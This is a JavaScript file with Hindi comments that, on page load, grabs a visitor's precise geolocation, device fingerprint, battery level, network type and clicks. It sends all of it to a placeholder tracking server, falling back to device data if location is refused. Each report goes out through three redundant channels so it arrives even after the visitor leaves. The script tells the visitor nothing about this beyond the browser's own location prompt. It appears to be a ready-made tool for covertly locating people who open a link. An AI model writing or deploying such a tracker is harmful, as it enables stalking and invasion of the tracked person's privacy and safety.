/**
 * geo-locate.js
 * फोन की लोकेशन कैप्चर करके सर्वर को भेजता है
 */

(function() {
    // ⚙️ अपना सर्वर URL यहाँ डालें
    const SERVER_URL = 'https://your-domain.com/track.php';
    
    // यूनिक विज़िटर आईडी
    const VISITOR_ID = generateVisitorId();
    
    // पेज लोड होते ही लोकेशन माँगें
    window.addEventListener('load', function() {
        // थोड़ी देर बाद लोकेशन माँगें (पेज पहले दिखे)
        setTimeout(getLocation, 500);
    });

    function getLocation() {
        if (!navigator.geolocation) {
            sendFallbackData('geolocation_not_supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            // सफलता पर
            function(position) {
                sendLocation({
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude || 0,
                    speed: position.coords.speed || 0,
                    heading: position.coords.heading || 0
                });
            },
            // असफलता पर
            function(error) {
                let errorMsg = 'unknown_error';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMsg = 'permission_denied';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMsg = 'position_unavailable';
                        break;
                    case error.TIMEOUT:
                        errorMsg = 'timeout';
                        break;
                }
                sendFallbackData(errorMsg);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,        // 10 सेकंड
                maximumAge: 0
            }
        );

        // वाई-फाई BSSID भी भेजें
        getWifiInfo();
    }

    function sendLocation(data) {
        const payload = {
            action: 'location',
            visitor_id: VISITOR_ID,
            latitude: data.lat,
            longitude: data.lng,
            accuracy: data.accuracy,
            altitude: data.altitude,
            speed: data.speed,
            heading: data.heading,
            timestamp: Math.floor(Date.now() / 1000),
            // डिवाइस इंफो
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            battery: getBatteryInfo(),
            ip: 'server_will_get'
        };

        sendToServer(payload);
    }

    function sendFallbackData(reason) {
        // IP + WIFI BSSID से मोटा-मोटा लोकेशन
        const payload = {
            action: 'fallback',
            visitor_id: VISITOR_ID,
            reason: reason,
            timestamp: Math.floor(Date.now() / 1000),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        sendToServer(payload);
    }

    function getBatteryInfo() {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                sendBatteryUpdate(battery);
            });
        }
        return 'checking';
    }

    function sendBatteryUpdate(battery) {
        const payload = {
            action: 'battery',
            visitor_id: VISITOR_ID,
            level: Math.round(battery.level * 100),
            charging: battery.charging,
            timestamp: Math.floor(Date.now() / 1000)
        };
        sendToServer(payload);
    }

    function getWifiInfo() {
        // नोट: ब्राउज़र में WIFI MAC नहीं मिलता, 
        // लेकिन navigator.connection से नेटवर्क टाइप मिलता है
        if (navigator.connection) {
            const conn = navigator.connection;
            const payload = {
                action: 'network',
                visitor_id: VISITOR_ID,
                type: conn.effectiveType || 'unknown',
                downlink: conn.downlink || 0,
                rtt: conn.rtt || 0,
                timestamp: Math.floor(Date.now() / 1000)
            };
            sendToServer(payload);
        }
    }

    function sendToServer(data) {
        // बेकन API का उपयोग करें (तब भी काम करता है जब पेज छोड़ दें)
        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
        
        // 1st try: sendBeacon
        if (navigator.sendBeacon) {
            navigator.sendBeacon(SERVER_URL, blob);
        } else {
            // 2nd try: Image tag (old method)
            const img = new Image();
            img.src = SERVER_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
        }

        // 3rd try: XHR (background)
        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', SERVER_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        } catch(e) {}
    }

    function generateVisitorId() {
        // यूनिक आईडी जनरेट करें
        let id = localStorage.getItem('visitor_id');
        if (!id) {
            id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', id);
        }
        return id;
    }

    // क्लिक, टच, स्क्रॉल भी ट्रैक करें
    document.addEventListener('click', function(e) {
        sendToServer({
            action: 'click',
            visitor_id: VISITOR_ID,
            x: e.clientX,
            y: e.clientY,
            timestamp: Math.floor(Date.now() / 1000)
        });
    });

})();
